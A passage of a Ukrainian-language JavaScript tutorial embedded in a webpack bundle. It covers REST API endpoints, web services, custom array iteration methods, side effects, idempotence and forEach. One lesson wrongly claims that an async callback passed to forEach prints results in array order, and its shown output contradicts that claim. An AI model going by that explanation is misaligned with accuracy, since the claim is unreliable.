**~endpoint~**.\nОднак для доступу до ресурсів потрібно вказати, який саме ресурс вас цікавить, і що ви хочете зробити з цим ресурсом (отримати ресурс, створити новий, видалити або оновити наявний).\n**~endpoint~** містить всю цю інформацію.\n\nЯк ми вже говорили раніше, кожен ресурс має унікальний ідентифікатор і з кожним ресурсом може бути виконано низку різних операцій (читання, створення, видалення, оновлення/зміна).\n\nТаким чином, **~endpoint~** не є ні URL (оскільки не містить інформації про розміщення ресурсу), ні URI (оскільки містить у собі не тільки ідентифікатор ресурсу, а й інформацію про операцію з ресурсом).\n\n!хїЯкщо якась операція з ресурсом допустима, то для неї є **~endpoint~**.\nЯкщо такого **~endpoint~** немає, то ця операція з ресурсом неможлива.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-02.png)\n^^^\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-04.png)\n^^^\n\n^^^[![ico-30 cap]]\n^^Розглянемо приклад API https://api.example.com.^^\n^^Припустимо, на сервері зберігається база даних користувачів.^^\n^^API дає змогу отримати список усіх юзерів і надає вам для цього **~endpoint~**:^^\n\n••https://api.example.com/users/all••\n\n^^Для отримання інформації конкретного юзера з унікальним ідентифікатором **iserId** ендпойнт буде вже іншим:^^\n\n••https://api.example.com/users/${iserId}••\n\n\n^^Для створення нового юзера (**POST**):^^\n\n••https://api.example.com/user/create••\n\n^^Для повної заміни всіх даних користувача (**PUT**):^^\n\n••https://api.example.com/user/change/${iserId}••\n\n^^Для часткової модифікації даних користувача (**PATCH**):^^\n••https://api.example.com/user/update/${iserId}••\n\n^^І для видалення юзера (**DELETE**):^^\n\n••https://api.example.com/user/remove/${iserId}••\n\n^^Серверний API парсить адресу запиту, і якщо цей рядок відповідає одному з допустимих варіантів, і якщо у вас є права на виконання таких операцій, то ваш запит виконується.^^\n\n^^^\n\nEndpoint у REST API - це точка, до якої звертається клієнт, щоб взаємодіяти із сервером.\nВін являє собою не просто URL-адресу, а сукупність адреси API і маршруту, який включає ідентифікатор ресурсу та інформацію про те, яку дію треба виконати. Це як веб-адреса, але з додатковими частинами, які вказують, що саме потрібно зробити з даними.\n\n______________________________________________\n\n## ![ico-25 icon] web service\n\n**Деякі терміни:**\n\n| ^^![ico-20 pin] **SOA** — **_Service Oriented Architecture_** — сервіс-орієнтована архітектура веб-додатків (набір архітектурних принципів).^^ |\n| ^^![ico-20 pin] **RPC** — **_Remote Procedure Call_** — віддалений виклик процедури.^^ |\n| ^^![ico-20 pin] **Сервіс** (service) — набір операцій, що приймають запит (~Request~) і видають відповідь (~Response~).^^ |\n| ^^![ico-20 pin] **Веб-сервіс** — програмна система зі стандартизованими інтерфейсами, яку ідентифікує веб-адреса, зі стандартизованими інтерфейсами.^^ |\n\nВеб-сервіси можуть взаємодіяти один з одним і зі сторонніми додатками за допомогою повідомлень, заснованих на певних протоколах.\n\nНайбільшого поширення набули такі протоколи реалізації **_веб-сервісів_**:\n\n![ico-20 green-ok] **SOAP**    (_Simple Object Access Protocol_)\n![ico-20 green-ok] **REST**    (_Representational State Transfer_)\n![ico-20 green-ok] **XML-RPC** (_XML Remote Procedure Call_)\n\n_________________________________________\n\n### ![ico-20 icon] REST API\n\nОсновний принцип **REST** полягає в обмеженні набору операцій - використовуються тільки операції **CRUD** (~Create~ ~Read~ ~Update~ ~Delete~).\n\nАрхітектурний стиль **REST** у більшості випадків передбачає використання протоколу HTTP.\n\nТому команди CRUD перетворено в HTTP-методи **POST** - **GET** - **PUT** - **DELETE**.\n\n^^^[![](icons/postman.png)]\n![](illustrations/api-rest-postman.png)\n^^^\n\n___________________________________________\n\n### ![ico-20 icon] SOAP vs REST\n\n**_API_** зазвичай класифікуються як **SOAP** або **REST**, і обидва використовуються для доступу до веб-сервісів.\n\n![ico-20 green-ok] **SOAP**: для обміну повідомленнями використовується формат XML.\n![ico-20 green-ok] **REST**: для отримання або надсилання інформації використовуються URL-адреси.\n\n**REST** використовує чотири різних HTTP 1.1 дієслова (~GET~, ~POST~, ~PUT~ и ~DELETE~).\n\nНа відміну від ~SOAP~, ~REST~ не обов\'язково повинен використовувати ~XML~ для надання відповіді.\n\nІснують веб-сервіси на основі REST, які виводять дані у форматі:\n\n| ^^• Command Separated Value (CSV)^^ |\n| ^^• JavaScript Object Notation (JSON)^^ |\n| ^^• Really Simple Syndication (RSS)^^ |\n\n^^Можна отримати результат у форматі, який легше парсити мовою вашого додатка.^^\n\n_____________________________________\n'},27343:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Як працюють ітеративні методи\n\n[◄◄◄ Ітеруючі методи масивів ◄◄◄](page/Array-iterating-methods.md)\n\nВивівши в консоль властивість **_~prototype~_** конструктора **~Array~**, можна переконатися, що ці структури даних успадковують багато методів, і деякі з них ми вже знаємо.\n\n~~~js\nconsole.log(Array.prototype)\n~~~\n\n{{{Array-iteration-methods-theory.js}}}\n\nДеякі методи, з якими ми вже знайомі, виконують якусь операцію над масивом.\n^^(додати елемент до масиву, видалити або замінити елементи в масиві, об'єднати кілька масивів в один тощо).^^\n\nІтеруючі методи перебирають елементи масиву один за одним строго в порядку зростання їх індексів.\n^^(за винятком ~reduceRight~, який здійснює перебір справа наліво).^^\n\n_Група ітеруючих методів масивів є прикладом реалізації функціональної парадигми._\n\nГоловне, що потрібно пам'ятати про ітеруючі методи масиву – це **функції вищого порядку**.\nЦе нагадає вам, що ![ico-20 warn] **першим і обов'язковим аргументом методу є функція**.\n\n• Метод буде перебирати елементи масиву один за одним, поки не досягне кінця масиву.\n• На кожній ітерації метод буде викликати передану йому **функцію-аргумент**.\n• При виклику **функції-аргументу** метод передасть їй значення поточного елемента масиву.\n\n_____________________________________________\n\n## ![ico-25 icon] Декоратор циклу\n\nПереваги методів перед операторами циклу очевидні.\nНаприклад, за допомогою методів ми організовуємо ланцюгові обчислення, а оператори циклу \"розбивають\" красивий ланцюжок, порушуючи гармонію нашого коду.\n\nЦикли вимагають від нас досить багато рутинної роботи: нам потрібно ініціалізувати змінну циклу, визначити, як вона буде змінюватися на кожній ітерації, контролювати її значення, щоб вчасно завершити цикл. Коротше кажучи, створити механізм циклу своїми руками. Ми навіть не будемо обговорювати можливі помилки, що виникають при цьому.\n\nЦикли ~for...of~ і ~for...in~ значно полегшили роботу з ітерування масивів і об'єктів. Однак це все ще оператори циклу, а не методи.\n\nКоли ми \"завертаємо\" цикл у функцію (метод), ми забезпечуємо можливість використання ланцюгових обчислень.\n\nТаким чином, ітеруючі методи можна інтерпретувати як функціональні «обгортки» для оператора ~for...of~.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\nУ цьому прикладі ми створили кастомний успадкований метод масивів **~iterate~**\nз формальним параметром ~func~ (^^function^^),\nякий перебирає в циклі ~for...of~ вихідний масив\nі на кожній ітерації викликає ~func~,\nпередаючи їй черговий елемент вихідного масиву.\n\nУ цьому прикладі метод **~iterate~** нічого не повертає,\nІ він не змінює вихідний масив, тобто не виробляє зовнішніх ефектів.\n\nТакого ж ефекту можна досягти за допомогою рекурсії:\n\n~~~js\nArray.prototype.iterate = function (func, index) {\n  if (typeof func !== 'function') throw new TypeError('First argument is not a function.')\n  let number = typeof index === 'number' ? index : 0\n  func(this[number])\n  number++ < this.length - 1 && this.iterate.call(this, func, number)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\n_____________________________________________\n\nЯкщо ми хочемо, щоб метод повернув новий масив, нам потрібно зробити наступне:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js   \nArray.prototype.iterate = function (func) {\n  const res = []\n  for (const item of this) res.push(typeof func === 'function' ? func(item) : item)\n  return res\n}\n\n;[49, 4, 25].iterate(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [7, 2, 5]\n~~~\n\nВ результаті кастомний метод **~iterate~** збиратиме\" в масив ~res~\nрезультати виклику функції ~func~ на кожній ітерації,\nта повертати масив ~res~.\n\n~~~js\nconst squaring = num => Math.pow(num, 2)\n;[7, 2, 5].iterate(squaring)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [49, 4, 25]\n~~~\n\n_____________________________________________\n\nМи можемо напилити кастомний метод, що фільтрує вихідний масив відповідно до заданої умови.\nТепер функція **~func~** має повертати логічне значення.\nЯкщо для чергового елемента масиву функція **~func~** поверне ~true~, цей елемент потрапить у результуючий масив **res**.\nВ іншому випадку – ні.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nArray.prototype.filtering = function (func) {\n  const res = []\n  for (const item of this) func(item) && res.push(item)\n  return res\n}\n\nconst func = num => num < 10\n;[108, 24, 5, 17, 1, 7].filtering(func)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [5, 1, 7]\n~~~\n\n~~~js   \n[7, 4, 1, 20, 8].filtering(item => item > 5)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [7, 20, 8]\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Передача посилань\n\n@@@@\nТут, на жаль, закінчується функціональна чистота ітеруючих методів.<br><br>**Посилання - це \"відмичка\"**, і за посиланням функція може мутувати об'єкт.<br><br>При цьому зазвичай виникають побічні ефекти (**side effects**).\n![](images/reference-lockpick-ukr.png)\n@@@@\n\nЄ два способи передачі посилань у методах ітерації масивів.\nПерший - передача посилання на **контекст виклику функції-аргумента** другим аргументом методу.\nДругий - передача посилання на вихідний масив самій **функції-аргументу** при виклику.\n\n### ![ico-20 icon] Другий аргумент методу\n\nКожен метод може приймати два аргументи: функцію та посилання на контекст виклику.\nКрім обов'язкового **аргументу-функції**, ми можемо передати методу другий (необов'язковий) аргумент - посилання на контекст виклику цієї функції.\nНасправді, другий аргумент звільняє нас від необхідності явно байндити контекст виклику функції, яка передається методу як аргумент.\n\n◘◘ ![ico-25 cap] ** 4** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [7, 5, 0, 11]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  for (const item of this) {\n    res.push(callback.call(context, item, this.indexOf(item), this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate(function (item, index, arr) {\n  return this[index] + arr[index]\n}, alter)\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [15, 9, 9, 18]\n~~~\n\n◘◘ ![ico-25 cap] ** 5** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [-4, 1, -2, 0]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  const func = callback.bind(context)\n  for (const item of this) res.push(func(item))\n  return res\n}\n\nconst sample = numbers.iterate(function (item) {\n  return item + this.shift()\n}, alter)\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [4, 5, 7, 7]\n~~~\n\nПроте з'являється побічний ефект - масив **alter** тепер порожній:\n\n~~~js\nconsole.log(alter) // []\n~~~\n\nЩе одна незручність полягає в тому, що при цьому ми не можемо передавати методу стрілочні функції, оскільки в них контекст виклику змінити неможливо.\nОднак стрілочні функції роблять код більш лаконічним.\n\n_____________________________________\n\n### ![ico-20 icon] Посилання на вихідний масив\n\nФункція-аргумент може мати три формальні параметри.\nПерший - це поточний елемент масиву.\nДругий - це індекс поточного елемента масиву.\nТретій - це посилання на вихідний масив.\nПередача цієї \"відмички\" функції-аргументу грубо руйнує функціональну чистоту методу і створює величезні можливості для побічних ефектів.\n\nНаступний приклад показує, як це працює.\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst numbers = [8, 4, 9, 7]\n\nArray.prototype.iterate = function (func) {\n  const res = []\n  let index = 0\n  for (const item of this) {\n    res.push(func(item, index++, this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate((item, index, arr) => item * index - arr[0])\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [-8, -4, 10, 13]\n~~~\n\n^^Функція **sample** отримує у змінній **_arr_** посилання на вихідний масив **numbers**.^^\n\n___________________________________________________\n\n## ![ico-25 icon] Side effects\n\n![ico-20 warn] Чисті функції, якими, в принципі, мали б бути ітеруючі методи, не викликають зовнішніх ефектів, тобто не мутують жодні зовнішні змінні.\nІтеруючі методи масивів - це функції вищого порядку, які перебирають вихідний масив, передаючи **функції-аргументу** по черзі один елемент масиву за іншим.\nОтже, **аргумент-функція** не має посилання на сам масив і не може його змінювати.\n_______________________\n![ico-20 warn] Виняток - якщо елементи початкового масиву мають **посилальний тип даних**, тобто функція-аргумент отримує посилання на елемент масиву.\n______________________\nПочатковий масив, як правило, залишається незмінним.\nТобто, спочатку вони повинні були бути чистими функціями, що не породжують зовнішніх ефектів, що робить їх відмінними від звичайних методів масивів, таких як ~push()~, ~concat()~ і т.д.\n\nПроте ми вже показали раніше, що ця функціональна чистота порушується передачею посилань (на контекст виклику **функції-аргумента** і на початковий масив).\n\nТак само, якщо ми матимемо справу з **глибокими структурами даних**, то відбувається передача не значень, а посилань, що створює можливість виникнення побічних ефектів.\n\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst users = [\n  { name: 'Helen', age: 25 },\n  { name: 'Robert', age: 18 },\n  { name: 'Mary', age: 20 },\n  { name: 'Piter', age: 30 }\n]\n\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\nusers\n  .iterate(user => user.age++)\n~~~\n\nУ цьому прикладі ми ітеруємо масив об'єктів, тобто маємо справу з глибокою структурою даних.\nНа кожній ітерації **функція-аргумент** (~user => user.age++~) методу **~iterate~** отримує посилання на об'єкт.\nЦе дає їй можливість мутувати вихідний масив, оскільки\n\n☼☼☼ Посилання - це відмичка ☼☼☼\n\nВ результаті виконання коду масив **users** буде виглядати наступним чином:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {name: 'Helen', age: 26}\n  ► 1: {name: 'Robert', age: 19}\n  ► 2: {name: 'Mary', age: 21}\n  ► 3: {name: 'Piter', age: 31}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nМи бачимо, що вік всіх користувачів змінився, хоча ми не передавали посилання на оригінальний масив **users**.\nАле масив **users** є глибокою структурою даних, а його елементи мають **посилальний тип**,\nтому **функція-аргумент** (~user => user.age++~) методу **~iterate~** отримала \"майстер-ключ\" і змогла змінювати об'єкти за посиланням.\n\nОтже, **побічні ефекти** виникають через передачу посилань замість значень.\n\n_____________________________________________\n\nУ наведеному нижче прикладі показано, що ви можете змінити саму функцію-аргумент:\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\nvar browsers = ['Chrome', 'FireFox', 'Opera', 'Safari', 'Edge']\n\nconst storeItem = function (item, index, arr) {\n  this.history = Array.isArray(this.history) ? this.history : []\n  this.history.push(item)\n}\n\nArray.prototype.iterate = function (func) {\n  for (var item of this) func.call(func.prototype, item)\n}\n\nbrowsers.iterate(storeItem, storeItem)\n\nconsole.dir(storeItem)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ ƒ storeItem(item, index, arr)\n  ▼ history: Array(5)\n      0: \"Chrome\"\n      1: \"FireFox\"\n      2: \"Opera\"\n      3: \"Safari\"\n      4: \"Edge\"\n      length: 5\n    ► __proto__: Array(0)\n    arguments: null\n    caller: null\n    length: 3\n    name: \"storeItem\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Ідемпотентність\n\nЯкщо метод повертає той самий результат з тим самим значенням аргументу, то він є **_ідемпотентним_**.\n\n^^Тобто, якщо викликати метод з одним і тим же масивом і функцією багаторазово, результат завжди буде однаковим.^^\n\nВ об'єктно-орієнтованих мовах ідемпотентність методів практично недосяжна, особливо коли аргументи функції мають посилальний тип даних.\nОскільки масиви мають посилальний тип даних, то ітеруючі методи масивів від початку працюють із посиланням.\nВикликаючи метод повторно з одним і тим самим посиланням, ми не гарантовані від того, що вміст масиву в інтервалі між двома викликами методу не змінився.\n\nСпробуємо створити ідемпотентний метод:\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\n\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return res\n}\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nПід час першого виклику методу **~idempotence~** з цим масивом метод змінює масив, додаючи до нього властивість ~initialState~ та зберігаючи в цій властивості посилання на початковий стан масиву.\n\nПри повторному виклику методу він ігнорує будь-які зміни, які могли статися з масивом між першим і другим викликами методу, і працює з клоном ~initialState~.\n\n~~~js\nnumbers[6] = 125\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nЗауважимо, що кожного разу метод буде повертати нове посилання, оскільки при кожному виклику метод створює новий масив, проте вміст цього масиву залишиться тим самим.\n\nДля чистоти експерименту можна повертати JSON-рядок.\n\n~~~js\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return JSON.stringify(res)\n}\n~~~\n\nОднак у даному прикладі ми використовували ідемпотентний метод **~Math.sqrt~**.\n\nЯкщо ж ми передамо методу **~idempotence~** функцію, яка не є ідемпотентною, то метод не буде ідемпотентним, оскільки при виклику з тим самим набором аргументів він повертатиме різний результат:\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(Math.random() * 100))\n~~~\n\nУ цьому прикладі видно, що якщо функція, яку ми передаємо методу **~idempotence~**, не є ідемпотентною, то результат роботи методу варіюватиме, тобто ідемпотентність методу залежить від ідемпотентності функції-аргумента.\n\nСпробуємо виправити цю ситуацію.\n\n^^^[![](icons/coffee.png)]\n~~~js\nArray.prototype.idempotence = function (func) {\n  const funcArg = func.toString()\n  try {\n    var sourceData = JSON.stringify(this)\n  } catch (err) {\n    console.warn(err)\n    return null\n  }\n\n  const self = this.__proto__\n\n  if (!self.funcs) self.funcs = []\n  if (!self.data) self.data = []\n  if (!self.results) self.results = []\n\n  if (!self.funcs.includes(funcArg)) self.funcs.push(funcArg)\n  if (!self.data.includes(sourceData)) self.data.push(sourceData)\n\n  const index = self.funcs.indexOf(funcArg)\n  const num = self.data.indexOf(sourceData)\n\n  if (!self.results[num]) self.results[num] = []\n\n  if (!self.results[num][index]) {\n    const result = []\n    for (const item of this) {\n      result.push(func(item))\n    }\n    self.results[num][index] = result\n  }\n\n  return self.results[num][index]\n}\n~~~\n^^^\n\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\nnumbers.idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\n[25, 16, 9, 49, 81, 64, 4].idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(item + Math.random() * 100))\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n\n~~~js\nconst randomize = item => item + Math.floor(item + Math.random() * 100)\n[25, 16, 9, 49, 81, 64, 4].idempotence(randomize)\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Приклади\n\nНадсилання контексту виклику.\n\n◘◘![ico-20 cap] **11**◘◘\n~~~js\nconst jobs = [\n  'developer',\n  'worker',\n  'salesman',\n  'manager'\n]\n\nconst users = [\n  { name: 'Piter', job: 1 },\n  { name: 'Helen', job: 2 },\n  { name: 'Robert', job: 0 },\n  { name: 'Michael', job: 1 },\n  { name: 'Andrew', job: 0 },\n  { name: 'Mary', job: 2 },\n  { name: 'Gregory', job: 3 },\n]\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  for (const item of this) result.push(func.call(context, item))\n  return result\n}\n\nfunction showUser (user) {\n  return `<p>${user.name}: ${this[user.job]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = users.iterate(showUser, jobs).join('')\n~~~\n\n_____________________________\n\nПередача функції-аргументу другого (опціонального) параметра (індексу поточного елемента масиву).\n\n◘◘![ico-20 cap] **12**◘◘\n\n~~~js\nconst salary = [4000, 3200, 4500, 2800, 3500, 2400, 3700]\n\nconst workers = ['Piter', 'Helen', 'Robert', 'Michael', 'Andrew', 'Mary', 'Gregory']\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  index = 0\n  for (const item of this) result.push(func.call(context, item, index++))\n  return result\n}\n\nfunction showSalary (worker, index) {\n  return `<p>${worker}: ${this[index]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = workers.iterate(showSalary, salary).join('')\n~~~\n\n__________________________________________\n\n◘◘![ico-20 cap] **13**◘◘\n\n~~~js\nconst arr = [\n  'google',\n  'service',\n  'user',\n  () => Math.round(Math.random() * 1000),\n  false\n]\n\nfunction test (elem, index, ref) {\n  typeof elem === 'function' && ref.splice(index, 1, elem())\n  return ref[index]\n}\n\nArray.prototype.iterate = function (func) {\n  var res = []\n  for (var item of this) res.push(func(item, this.indexOf(item), this))\n  return res\n}\n\narr.iterate(test)\n~~~\n__________________________________________\n\nВикористовуємо другий та третій опіцональні параметри функції-аргументу:\n\n◘◘![ico-20 cap] **14**◘◘\n\n~~~js\nconst companList = ['Google', 'Mozilla', 'Microsoft']\nconst browsers = ['Chrome', 'Firefox', 'Edge']\n\nfunction test (prop, index) {\n  this[index] = { [prop] : this[index] }\n}\n\nArray.prototype.iterate = function (func, context) {\n  var index = index && typeof index === 'number' ? index : 0\n  for (var item of this) func.call(context, item, index++)\n}\n\ncompanList.iterate(test, browsers)\n\nconsole.log(browsers)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {Google: \"Chrome\"}\n  ► 1: {Mozilla: \"Firefox\"}\n  ► 2: {Microsoft: \"Edge\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n________________________________________________________________\n\n\n[◄◄◄Ітеруючі методи масивів◄◄◄](page/Array-iterating-methods.md)\n\n________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/arrayIterationMethods)\n"},54049:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Ітеруючі методи масивів\n\nЦі методи вчать мислити в рамках **функціональної парадигми**.\n\nВсі ітеруючі методи масивів є **функціями вищого порядку**.\n![ico-20 exclamation] Обов'язковим першим аргументом кожного методу є **функція**.\n![ico-20 warn] У разі, якщо при виклику методу першим аргументом не буде функція, то буде згенеровано виняток **TypeError**.\n^^Другий аргумент методу є необов'язковим, він є посиланням на контекст виклику **функції аргументу**.^^\n\nПо суті, ітеруючі методи масивів є функціональною «обгорткою» для **~for...of~**.\nКожен метод перебирає елементи масиву від першого до останнього, і на кожній ітерації викликає передану йому **функцію-аргумент**.\n\n**Функція-аргумент** методу має три необов'язкові формальні параметри:\n1) поточний елемент масиву.\n2) індекс поточного елементу масиву.\n3) посилання на ітерований масив.\n\n[►►►Давайте заглянемо глибше?►►►](page/Array-iterating-methods-theory.md)\n\n_____________________________________________________\n\n## ![ico-30 icon] forEach()\n\n![ico-20 warn] Цей метод не повертає жодного значення.\nДавайте порівняємо роботу цього методу з роботою **~for...of~**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach(currentName => console.log(currentName))\n\nfor (const currentName of people) console.log(currentName)\n~~~\n\n^^Тут ми перебираємо масив **people**, використовуючи метод **~forEach~**^^.\n^^Анонімна функція передається **~forEach~** як аргумент:^^\n\n~~~js\ncurrentName => console.log(currentName)\n~~~\n\nУ цьому прикладі результат роботи методу **~forEach~** і оператора циклу **~for...of~** буде ідентичним.\nОднак у різних ситуаціях нам зручніше використовувати або оператор **~for...of~**, або метод **~forEach~**.\nОскільки метод **~forEach~** не повертає жодного значення, використовувати його в ланцюгових обчисленнях начебто немає сенсу.\nТоді в чому його перевага перед оператором **~for...of~**?\n\nЯкщо ви навчитеся мислити категоріями функціональної парадигми, то перевага методу перед оператором стане для вас очевидною.\nАле навіть якщо не говорити про те, наскільки методи зручніші за оператори, є ряд додаткових переваг **~forEach~** перед **~for...of~**.\nНаприклад, метод **~forEach~** передає в аргумент не тільки значення елемента масиву, але і його індекс.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst  people = ['Ivan', 'Mary', 'Elena', 'Andrey']\n\npeople.forEach((currentValue, index) => console.log(`${index + 1}: ${currentValue}`))\n~~~\n\n~~~console\n1: Ivan\n2: Mary\n3: Elena\n4: Andrey\n~~~\n_______________________________\n\n![ico-25 warn] Якщо ви ще не знайомі з асинхронщиною (промісами та асинхронними функціями), то поверніться до наступного прикладу пізніше.\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nconst show = user => new Promise(resolve => setTimeout(() => resolve(user.name), Math.random() * 3000))\n\nusers.forEach(async user => console.log(await show(user)))\n~~~\n\nУ цьому прикладі ми моделюємо затримку, пов'язану з отриманням даних користувача з віддаленого сервера, за допомогою функції **~show~**, яка повертає проміс.\n\nПередаючи асинхронну анонімну функцію в метод **~forEach~**, ми гарантуємо, що імена користувачів послідовно виводяться з масиву.\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nТепер скористаємося оператором **~for...of~**:\n\n~~~js\nfor (const user of users) {\n  show(user).then(name => console.log(name))\n}\n~~~\n\nЯк бачимо, імена користувачів виводяться у довільному порядке:\n\n~~~console\nStephan\nMary\nRobert\nPiter\n~~~\n\nІ для того, щоб зберегти порядок імен користувачів відповідно до їх індексу в масиві, нам доводиться \"загортати\" оператор циклу в асинхронну функцію:\n\n~~~js\nasync function showUsers (users) {\n  for (const user of users) {\n    console.log(await show(user))\n  }\n}\n\nshowUsers(users)\n~~~\n\n~~~console\nMary\nRobert\nStephan\nPiter\n~~~\n\nВиникає питання - а навіщо це робити, якщо у нас вже є функціональна \"обгортка\" для циклу **~for...of~**?\n_____________________\n\nСлід зазначити, що іноді використання оператора циклу **~for...of~** буває зручніше, ніж виклик методу  **~forEach~**.\nНаприклад, якщо ви хочете використовувати оператори **~continue~** | **~break~**, то ваш вибір - оператор **~for...of~**.\n\n__________________________________________\n\nТретій формальний параметр **функції-аргументу** є досить проблемним.\nВін є посиланням на вихідний масив.\nА ми знаємо, що\n\n☼☼☼ посилання - це відмичка ☼☼☼\n\nПередача посилання дозволяє мутувати вихідний масив:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\n\nnumbers.forEach((numb, ind, res) => res[ind] = numb * 2)\n\nconsole.log(numbers) // [ 16, 8, 18, 14 ]\n~~~\n\n^^тобто вихідний масив **numbers** було змінено.^^\n\nНадаючи **функції-аргументу** доступу до вихідного масиву за посиланням, ми створюємо можливість виникнення **побічних ефектів**, пов'язаних із можливими мутаціями вихідного масиву.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst users = ['Mary', 'Piter', 'Robert', 'Stephan']\n\nusers.forEach((name, index, arr) => console.log(arr.pop()))\n~~~\n\nМожливо, ви очікували побачити повний список користувачів у консолі, але побачили лише два останні імені з масиву:\n\n~~~console\nStephan\nRobert\n~~~\n\nПри цьому в масиві **users** залишилися тільки два перші імені:\n\n~~~js\nconsole.log(users)\n~~~\n\n~~~console\n► (2) ['Mary', 'Piter']\n~~~\n\nЦе побічний ефект мутації масиву **users**.\nНа кожній ітерації довжина масиву зменшується на ** 1**, а метод **~forEach~** порівнює поточне значення індексу з довжиною масиву, і зупиняє цикл, коли значення індексу стає рівним довжині масиву. Після двох ітерацій значення індексу буде ** 2**, і довжина масиву теж буде ** 2**.\n\n___________________________\n\nМутації вихідного масиву можуть бути навіть без передачі посилання вихідний масив. Це пов'язано з тим, що якщо елементи масиву мають **посилальний тип даних**, то **функція-аргумент** методу отримає не значення, а посилання, і це створює можливість мутацій елементів масиву за посиланням.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', age: 25, job: 'dev' },\n  { name: 'Piter', age: 37, job: 'worker' },\n  { name: 'Robert', age: 28, job: 'journalist' },\n  { name: 'Stephan', age: 40, job: 'manager' }\n]\n\nusers.forEach(user => console.log(`${user.name}: ${++user.age}`))\n~~~\n\n~~~console\nMary: 26\nPiter: 38\nRobert: 29\nStephan: 41\n~~~\n\n_________________________________________________\n\n### ![ico-25 icon] Контекст виклику функції-аргументу\n\nМетод **~forEach~**, як, втім, і майже всі інші ітеруючі методи масивів, може приймати додатковий аргумент - посилання на контекст виклику **функції-аргументу**.\n\n![ico-20 warn] Однак при цьому функція, що передається методу як аргумент, не повинна бути стрілочною.\n\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 